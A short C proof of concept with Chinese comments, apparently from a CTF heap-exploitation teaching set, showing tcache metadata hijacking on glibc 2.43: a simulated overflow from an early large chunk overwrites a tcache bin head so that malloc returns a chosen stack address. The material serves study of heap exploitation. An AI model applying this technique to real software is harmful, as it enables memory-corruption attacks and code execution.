/*
 * 中文导读（CTF 版）
 *
 * 手法：tcache_metadata_hijacking
 * 文件标注范围：2.43
 * 模拟漏洞：在 tcache 延迟初始化前分配大块，并能从该大块溢出到随后创建的 tcache 元数据。
 * 核心流程：2.42 起非 tcache 路径不再总是先 MAYBE_INIT_TCACHE，可让 tcache_perthread_struct 落在可控 chunk 之后。
 * 成功判据：覆盖 entries 后下一次小块申请返回 target；2.43 因结构体/TLS 哨兵变化使用不同索引。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	// 禁用标准流缓冲，避免 _IO_FILE 的隐式申请干扰本例堆布局。
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	// 背景说明：2.42 起 tcache 管理结构不一定在第一次大块申请之前初始化。

	long target[0x4] __attribute__ ((aligned (0x10)));

	long *chunk = malloc(0x420);

	void *p1 = malloc(0x10);
	free(p1);

	/* 漏洞模拟开始：用堆溢出覆盖 tcache entries 中目标尺寸桶的表头。 */
	chunk[0x420/8+25] = (long)&target[0];
	/* 漏洞模拟结束：下一次同尺寸申请会消费被替换的表头。 */

	void *p2 = malloc(0x10);

	assert(p2 == &target[0]);
}
